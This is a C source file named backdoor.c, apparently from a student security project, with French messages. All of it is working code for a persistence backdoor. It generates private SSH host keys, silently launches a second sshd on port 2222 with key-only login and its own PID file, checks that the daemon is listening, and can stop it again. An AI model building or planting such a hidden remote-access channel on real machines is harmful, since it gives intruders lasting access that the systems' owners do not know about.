/**
 * @file backdoor.c
 *
 * @author Enzocte <enzo.cateau@etudiant.univ-lr.fr>
 * @date 2026
 */

#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define HOSTKEY_DIR "./hostkeys"
#define ED25519_KEY "./hostkeys/ssh_host_ed25519_key"
#define RSA_KEY "./hostkeys/ssh_host_rsa_key"
#define PID_FILE "./hostkeys/sshd_2222.pid"
#define SSHD_PATH "/usr/sbin/sshd"
#define SSH_KEYGEN "ssh-keygen"
#define SSH_PORT 2222

static int file_exists(const char *path) {
  struct stat st;
  return stat(path, &st) == 0;
}

static int ensure_dir(const char *path) {
  struct stat st;
  if (stat(path, &st) == 0) {
    if (S_ISDIR(st.st_mode)) {
      return 0;
    }
    fprintf(stderr, "%s existe mais n'est pas un dossier\n", path);
    return -1;
  }
  if (mkdir(path, 0700) != 0) {
    perror("mkdir");
    return -1;
  }
  return 0;
}

static int run_cmd(char *const argv[]) {
  pid_t pid = fork();
  if (pid < 0) {
    perror("fork");
    return -1;
  }
  if (pid == 0) {
    execvp(argv[0], argv);
    perror("execvp");
    _exit(127);
  }

  int status = 0;
  if (waitpid(pid, &status, 0) < 0) {
    perror("waitpid");
    return -1;
  }

  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    fprintf(stderr, "Commande echouee: %s\n", argv[0]);
    return -1;
  }
  return 0;
}

static int generate_hostkeys_if_needed(void) {
  if (ensure_dir(HOSTKEY_DIR) != 0) {
    return -1;
  }

  if (!file_exists(ED25519_KEY)) {
    char *cmd[] = {SSH_KEYGEN,  "-t", "ed25519", "-f",
                   ED25519_KEY, "-N", "",        NULL};
    if (run_cmd(cmd) != 0) {
      fprintf(stderr, "Echec generation cle ed25519\n");
      return -1;
    }
  }

  if (!file_exists(RSA_KEY)) {
    char *cmd[] = {SSH_KEYGEN, "-t",    "rsa", "-b", "3072",
                   "-f",       RSA_KEY, "-N",  "",   NULL};
    if (run_cmd(cmd) != 0) {
      fprintf(stderr, "Echec generation cle RSA\n");
      return -1;
    }
  }

  if (chmod(ED25519_KEY, 0600) != 0) {
    perror("chmod ed25519");
    return -1;
  }
  if (chmod(RSA_KEY, 0600) != 0) {
    perror("chmod rsa");
    return -1;
  }

  return 0;
}

static int is_port_listening_local(int port) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    perror("socket");
    return 0;
  }

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons((unsigned short)port);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  int ok = (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0);
  close(sock);
  return ok;
}

static int is_sshd_running_2222(void) {
  FILE *fp = fopen(PID_FILE, "r");
  if (!fp) {
    return 0;
  }

  pid_t pid = 0;
  if (fscanf(fp, "%d", &pid) != 1) {
    fclose(fp);
    return 0;
  }
  fclose(fp);

  if (pid <= 1) {
    return 0;
  }

  if (kill(pid, 0) == 0) {
    return 1;
  }

  return 0;
}

static int launch_sshd_2222(void) {
  if (!file_exists(SSHD_PATH)) {
    fprintf(stderr, "%s introuvable\n", SSHD_PATH);
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    perror("fork");
    return -1;
  }

  if (pid == 0) {
    char *args[] = {SSHD_PATH,
                    "-D",
                    "-e",
                    "-p",
                    "2222",
                    "-h",
                    ED25519_KEY,
                    "-h",
                    RSA_KEY,
                    "-o",
                    "PidFile=" PID_FILE,
                    "-o",
                    "PasswordAuthentication=no",
                    "-o",
                    "PermitRootLogin=no",
                    NULL};

    execv(SSHD_PATH, args);
    perror("execv sshd");
    _exit(1);
  }

  for (int i = 0; i < 20; i++) {
    usleep(200000);
    if (is_port_listening_local(SSH_PORT)) {
      printf("[+] sshd lance sur le port %d (PID enfant %d)\n", SSH_PORT, pid);
      return 0;
    }
  }

  fprintf(stderr, "[-] sshd n'ecoute pas sur %d\n", SSH_PORT);
  return -1;
}

static int stop_sshd_2222(void) {
  FILE *fp = fopen(PID_FILE, "r");
  if (!fp) {
    fprintf(stderr, "PID file introuvable: %s\n", PID_FILE);
    return -1;
  }

  pid_t pid = 0;
  if (fscanf(fp, "%d", &pid) != 1) {
    fclose(fp);
    fprintf(stderr, "Impossible de lire le PID\n");
    return -1;
  }
  fclose(fp);

  if (kill(pid, SIGTERM) != 0) {
    perror("kill");
    return -1;
  }

  unlink(PID_FILE);
  printf("[+] sshd arrete (PID %d)\n", pid);
  return 0;
}

int ssh_backdoor(bool stop) {
  if (stop) {
    return stop_sshd_2222() == 0 ? 0 : 1;
  }

  if (generate_hostkeys_if_needed() != 0) {
    return EXIT_FAILURE;
  }

  if (is_sshd_running_2222()) {
    printf("[=] sshd semble deja actif sur %d\n", SSH_PORT);
    return EXIT_SUCCESS;
  }

  if (launch_sshd_2222() != 0) {
    return EXIT_FAILURE;
  }

  printf("[*] Test local:\n");
  printf("    ssh -p 2222 %s@localhost\n",
         getenv("USER") ? getenv("USER") : "ton_user");
  return EXIT_SUCCESS;
}
